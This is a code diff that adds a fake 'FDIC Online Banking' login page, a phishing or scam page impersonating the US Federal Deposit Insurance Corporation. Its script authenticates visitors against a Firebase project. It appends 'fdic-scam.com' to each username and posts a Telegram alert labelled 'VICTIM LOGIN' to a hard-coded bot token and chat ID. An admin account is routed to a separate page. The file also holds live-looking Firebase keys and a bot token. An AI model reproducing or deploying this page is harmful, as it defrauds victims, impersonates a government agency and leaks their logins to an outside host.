@@ -1,10 +1,145 @@
-<script type="module">
-  import { app } from "./app.js";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FDIC Online Banking | Login</title>
+  <style>
+    :root {
+      --fdic-blue: #003366;
+      --fdic-light-blue: #00509e;
+      --fdic-gray: #f4f6f8;
+      --text-dark: #333;
+      --white: #ffffff;
+      --border: #d1d5db;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    body { background: var(--fdic-gray); color: var(--text-dark); min-height: 100vh; display: flex; flex-direction: column; }
+    
+    /* Header */
+    .top-bar { background: var(--fdic-blue); color: white; padding: 10px 20px; font-size: 12px; display: flex; justify-content: flex-end; gap: 15px; }
+    .top-bar a { color: white; text-decoration: none; }
+    
+    /* Login Container */
+    .login-wrapper { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; background: linear-gradient(135deg, var(--fdic-blue) 0%, var(--fdic-light-blue) 100%); }
+    .login-card { background: var(--white); padding: 40px; border-radius: 6px; box-shadow: 0 4px 15px rgba(0,0,0,0.15); width: 100%; max-width: 420px; }
+    
+    .logo-area { text-align: center; margin-bottom: 30px; }
+    .logo-area h1 { color: var(--fdic-blue); font-size: 32px; font-weight: 700; letter-spacing: 1px; margin-bottom: 5px; }
+    .logo-area p { color: #666; font-size: 14px; }
+    
+    .form-group { margin-bottom: 20px; }
+    .form-group label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 500; color: var(--text-dark); }
+    .form-group input { width: 100%; padding: 12px; border: 1px solid var(--border); border-radius: 4px; font-size: 16px; transition: border-color 0.2s; }
+    .form-group input:focus { outline: none; border-color: var(--fdic-light-blue); box-shadow: 0 0 0 3px rgba(0, 80, 158, 0.1); }
+    
+    .btn-primary { width: 100%; padding: 14px; background: var(--fdic-light-blue); color: var(--white); border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+    .btn-primary:hover { background: var(--fdic-blue); }
+    
+    .error-msg { color: #d9534f; font-size: 14px; margin-top: 10px; text-align: center; display: none; }
+    
+    /* Footer */
+    footer { background: #f8f9fa; border-top: 1px solid var(--border); padding: 20px; text-align: center; font-size: 13px; color: #666; }
+    footer a { color: var(--fdic-light-blue); text-decoration: none; margin: 0 10px; }
+    footer a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
 
-  document.getElementById('loginForm').addEventListener('submit', (e) => {
-    e.preventDefault();
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-    app.handleLogin(username, password);
-  });
-</script>
+  <div class="top-bar">
+    <a href="#">Help</a>
+    <a href="#">Contact</a>
+    <a href="#">English</a>
+  </div>
+
+  <div class="login-wrapper">
+    <div class="login-card">
+      <div class="logo-area">
+        <h1>FDIC</h1>
+        <p>Online Banking Portal</p>
+      </div>
+      
+      <form id="loginForm">
+        <div class="form-group">
+          <label for="username">Username</label>
+          <input type="text" id="username" placeholder="Enter your username" required>
+        </div>
+        <div class="form-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" placeholder="Enter your password" required>
+        </div>
+        <button type="submit" class="btn-primary">Sign In</button>
+        <div class="error-msg" id="errorMsg">Invalid Username or Password</div>
+      </form>
+    </div>
+  </div>
+
+  <footer>
+    <p>&copy; 2026 Federal Deposit Insurance Corporation. All rights reserved.</p>
+    <p>
+      <a href="#">Terms and Conditions</a> | 
+      <a href="#">Privacy Policy</a>
+    </p>
+  </footer>
+
+  <script type="module">
+    // --- PASTE YOUR FIREBASE CONFIG HERE ---
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+    import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+    import { getDatabase } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
+
+    const firebaseConfig = {
+  apiKey: "AIzaSyBkx-EEG7HdjfIuHkxdWSZrjjFaX-hGy68",
+  authDomain: "fdicsupport-cae27.firebaseapp.com",
+  projectId: "fdicsupport-cae27",
+  storageBucket: "fdicsupport-cae27.firebasestorage.app",
+  messagingSenderId: "874213007292",
+  appId: "1:874213007292:web:bf04711a109df8c85b95b9"
+};
+
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+    const db = getDatabase(app);
+
+    // Telegram Notification (Optional)
+    const TELEGRAM_BOT_TOKEN = "8983043957:AAGncbc73rTjiutiUMOSyDtiGJoqJOUqHSM"; 
+    const TELEGRAM_CHAT_ID = "7706898844";
+
+    function sendTelegramNotification(message) {
+      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+        });
+      }
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const errorMsg = document.getElementById('errorMsg');
+      
+      errorMsg.style.display = 'none';
+
+      const email = `${username}@fdic-scam.com`;
+
+      signInWithEmailAndPassword(auth, email, password)
+        .then((userCredential) => {
+          if (username === "admin") {
+            window.location.href = "admin.html";
+          } else {
+            sendTelegramNotification(`🚨 VICTIM LOGIN: ${username}`);
+            window.location.href = "dashboard.html";
+          }
+        })
+        .catch((error) => {
+          errorMsg.style.display = 'block';
+          errorMsg.textContent = "Invalid Username or Password";
+        });
+    });
+  </script>
+</body>
+</html>
